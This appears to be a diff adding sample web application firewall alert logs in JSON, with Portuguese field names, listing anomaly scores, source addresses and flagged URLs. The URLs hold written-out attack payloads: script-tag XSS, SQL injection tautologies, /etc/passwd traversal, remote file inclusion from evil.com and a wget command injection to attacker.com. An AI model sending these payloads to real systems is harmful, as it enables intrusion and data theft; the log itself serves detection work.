@@ -1,0 +1,315 @@
+[
+  {
+    "Anomaly Score": "15",
+    "Data": "17/May/2025",
+    "Hora": "15:56:41",
+    "ID": "53daca0b",
+    "IP Atacante": "172.16.117.1",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "NoScript XSS InjectionChecker: HTML Injection",
+      "Javascript method detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 15)",
+      "XSS Filter - Category 1: Script Tag Vector",
+      "Anomaly Scores: (Inbound Scores: blocking=15, detection=15, per_pl=15-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=15, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=15)"
+    ],
+    "URL": "/produtos/%3Cscript%3Ealert(%22oi%22)%3C/script%3E"
+  },
+  {
+    "Anomaly Score": "10",
+    "Data": "17/May/2025",
+    "Hora": "15:59:07",
+    "ID": "53daca0b",
+    "IP Atacante": "172.16.117.1",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "Inbound Anomaly Score Exceeded (Total Score: 10)",
+      "SQL Injection Attack Detected via libinjection",
+      "Anomaly Scores: (Inbound Scores: blocking=10, detection=10, per_pl=10-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=10, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=10)"
+    ],
+    "URL": "/produtos?username=1%27%20or%20%271%27%20=%20%271&amp;password=1%27%20or%20%271%27%20=%20%271"
+  },
+  {
+    "Anomaly Score": "7",
+    "Data": "18/May/2025",
+    "Hora": "01:29:27",
+    "ID": "34af594a",
+    "IP Atacante": "172.16.232.90",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "SQL Injection Attack Detected via libinjection",
+      "Inbound Anomaly Score Exceeded (Total Score: 7)",
+      "Anomaly Scores: (Inbound Scores: blocking=7, detection=7, per_pl=7-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=7, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=7)"
+    ],
+    "URL": "/login?user=1%27%20or%20%271%27=%271&pass=foo"
+  },
+  {
+    "Anomaly Score": "5",
+    "Data": "20/May/2025",
+    "Hora": "06:11:01",
+    "ID": "bb7426e1",
+    "IP Atacante": "172.16.2.40",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "Local File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 5)",
+      "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=5, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"
+    ],
+    "URL": "/index.php?page=../../../../etc/passwd"
+  },
+  {
+    "Anomaly Score": "7",
+    "Data": "18/May/2025",
+    "Hora": "04:45:36",
+    "ID": "4a421206",
+    "IP Atacante": "107.156.53.90",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "Remote File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 7)",
+      "Anomaly Scores: (Inbound Scores: blocking=7, detection=7, per_pl=7-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=7, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=7)"
+    ],
+    "URL": "/load?module=http://evil.com/shell.txt"
+  },
+  {
+    "Anomaly Score": "12",
+    "Data": "17/May/2025",
+    "Hora": "16:35:33",
+    "ID": "5daa9f15",
+    "IP Atacante": "172.16.117.232",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "Remote File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 12)",
+      "Anomaly Scores: (Inbound Scores: blocking=12, detection=12, per_pl=12-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=12, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=12)"
+    ],
+    "URL": "/load?module=http://evil.com/shell.txt"
+  },
+  {
+    "Anomaly Score": "7",
+    "Data": "19/May/2025",
+    "Hora": "16:35:13",
+    "ID": "560580e8",
+    "IP Atacante": "182.0.112.8",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "Local File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 7)",
+      "Anomaly Scores: (Inbound Scores: blocking=7, detection=7, per_pl=7-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=7, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=7)"
+    ],
+    "URL": "/index.php?page=../../../../etc/passwd"
+  },
+  {
+    "Anomaly Score": "10",
+    "Data": "19/May/2025",
+    "Hora": "16:31:56",
+    "ID": "ea8f0607",
+    "IP Atacante": "175.85.14.120",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "Local File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 10)",
+      "Anomaly Scores: (Inbound Scores: blocking=10, detection=10, per_pl=10-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=10, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=10)"
+    ],
+    "URL": "/index.php?page=../../../../etc/passwd"
+  },
+  {
+    "Anomaly Score": "12",
+    "Data": "17/May/2025",
+    "Hora": "15:27:46",
+    "ID": "bb49ebc9",
+    "IP Atacante": "234.132.100.171",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "SQL Injection Attack Detected via libinjection",
+      "Inbound Anomaly Score Exceeded (Total Score: 12)",
+      "Anomaly Scores: (Inbound Scores: blocking=12, detection=12, per_pl=12-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=12, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=12)"
+    ],
+    "URL": "/login?user=1%27%20or%20%271%27=%271&pass=foo"
+  },
+  {
+    "Anomaly Score": "15",
+    "Data": "17/May/2025",
+    "Hora": "11:16:49",
+    "ID": "123bfe07",
+    "IP Atacante": "32.232.197.117",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "Local File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 15)",
+      "Anomaly Scores: (Inbound Scores: blocking=15, detection=15, per_pl=15-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=15, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=15)"
+    ],
+    "URL": "/index.php?page=../../../../etc/passwd"
+  },
+  {
+    "Anomaly Score": "5",
+    "Data": "17/May/2025",
+    "Hora": "21:15:52",
+    "ID": "8032bce0",
+    "IP Atacante": "172.16.249.111",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "SQL Injection Attack Detected via libinjection",
+      "Inbound Anomaly Score Exceeded (Total Score: 5)",
+      "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=5, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"
+    ],
+    "URL": "/login?user=1%27%20or%20%271%27=%271&pass=foo"
+  },
+  {
+    "Anomaly Score": "12",
+    "Data": "20/May/2025",
+    "Hora": "02:45:18",
+    "ID": "7b136f5c",
+    "IP Atacante": "172.16.150.138",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "Remote File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 12)",
+      "Anomaly Scores: (Inbound Scores: blocking=12, detection=12, per_pl=12-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=12, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=12)"
+    ],
+    "URL": "/load?module=http://evil.com/shell.txt"
+  },
+  {
+    "Anomaly Score": "5",
+    "Data": "20/May/2025",
+    "Hora": "16:08:33",
+    "ID": "8f039ad8",
+    "IP Atacante": "27.95.252.44",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "NoScript XSS InjectionChecker: HTML Injection",
+      "Inbound Anomaly Score Exceeded (Total Score: 5)",
+      "XSS Filter - Category 1: Script Tag Vector",
+      "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=5, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"
+    ],
+    "URL": "/produtos/%3Cscript%3Ealert(%22x%22)%3C/script%3E"
+  },
+  {
+    "Anomaly Score": "5",
+    "Data": "17/May/2025",
+    "Hora": "15:44:42",
+    "ID": "7063e6ae",
+    "IP Atacante": "188.175.40.86",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "Remote File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 5)",
+      "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=5, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"
+    ],
+    "URL": "/load?module=http://evil.com/shell.txt"
+  },
+  {
+    "Anomaly Score": "10",
+    "Data": "18/May/2025",
+    "Hora": "22:08:49",
+    "ID": "c8808c1f",
+    "IP Atacante": "101.211.203.132",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "Remote Command Execution Attempt Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 10)",
+      "Anomaly Scores: (Inbound Scores: blocking=10, detection=10, per_pl=10-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=0, RCE=10, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=10)"
+    ],
+    "URL": "/search?q=;wget%20http://attacker.com%20"
+  },
+  {
+    "Anomaly Score": "7",
+    "Data": "18/May/2025",
+    "Hora": "08:36:18",
+    "ID": "02ecfff3",
+    "IP Atacante": "187.103.198.139",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "Remote File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 7)",
+      "Anomaly Scores: (Inbound Scores: blocking=7, detection=7, per_pl=7-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=7, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=7)"
+    ],
+    "URL": "/load?module=http://evil.com/shell.txt"
+  },
+  {
+    "Anomaly Score": "12",
+    "Data": "20/May/2025",
+    "Hora": "16:31:51",
+    "ID": "57f44a45",
+    "IP Atacante": "107.238.164.28",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "Remote File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 12)",
+      "Anomaly Scores: (Inbound Scores: blocking=12, detection=12, per_pl=12-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=12, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=12)"
+    ],
+    "URL": "/load?module=http://evil.com/shell.txt"
+  },
+  {
+    "Anomaly Score": "12",
+    "Data": "17/May/2025",
+    "Hora": "16:42:41",
+    "ID": "92b6f1a9",
+    "IP Atacante": "172.16.250.248",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "SQL Injection Attack Detected via libinjection",
+      "Inbound Anomaly Score Exceeded (Total Score: 12)",
+      "Anomaly Scores: (Inbound Scores: blocking=12, detection=12, per_pl=12-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=12, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=12)"
+    ],
+    "URL": "/login?user=1%27%20or%20%271%27=%271&pass=foo"
+  },
+  {
+    "Anomaly Score": "10",
+    "Data": "18/May/2025",
+    "Hora": "12:23:29",
+    "ID": "2d5ad03d",
+    "IP Atacante": "32.82.96.134",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "Local File Inclusion Attack Detected",
+      "Inbound Anomaly Score Exceeded (Total Score: 10)",
+      "Anomaly Scores: (Inbound Scores: blocking=10, detection=10, per_pl=10-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=10, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=10)"
+    ],
+    "URL": "/index.php?page=../../../../etc/passwd"
+  },
+  {
+    "Anomaly Score": "12",
+    "Data": "20/May/2025",
+    "Hora": "15:21:38",
+    "ID": "1aea5ab3",
+    "IP Atacante": "172.16.9.243",
+    "Método": "POST",
+    "Títulos do Ataque": [
+      "SQL Injection Attack Detected via libinjection",
+      "Inbound Anomaly Score Exceeded (Total Score: 12)",
+      "Anomaly Scores: (Inbound Scores: blocking=12, detection=12, per_pl=12-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=12, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=12)"
+    ],
+    "URL": "/login?user=1%27%20or%20%271%27=%271&pass=foo"
+  },
+  {
+    "Anomaly Score": "5",
+    "Data": "17/May/2025",
+    "Hora": "22:32:19",
+    "ID": "599a6ed5",
+    "IP Atacante": "172.16.230.215",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "NoScript XSS InjectionChecker: HTML Injection",
+      "Inbound Anomaly Score Exceeded (Total Score: 5)",
+      "XSS Filter - Category 1: Script Tag Vector",
+      "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=5, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"
+    ],
+    "URL": "/produtos/%3Cscript%3Ealert(%22x%22)%3C/script%3E"
+  },
+  {
+    "Anomaly Score": "7",
+    "Data": "18/May/2025",
+    "Hora": "13:44:20",
+    "ID": "da46e6cb",
+    "IP Atacante": "172.16.131.130",
+    "Método": "GET",
+    "Títulos do Ataque": [
+      "NoScript XSS InjectionChecker: HTML Injection",
+      "Inbound Anomaly Score Exceeded (Total Score: 7)",
+      "XSS Filter - Category 1: Script Tag Vector",
+      "Anomaly Scores: (Inbound Scores: blocking=7, detection=7, per_pl=7-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=7, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=7)"
+    ],
+    "URL": "/produtos/%3Cscript%3Ealert(%22x%22)%3C/script%3E"
+  }
+]
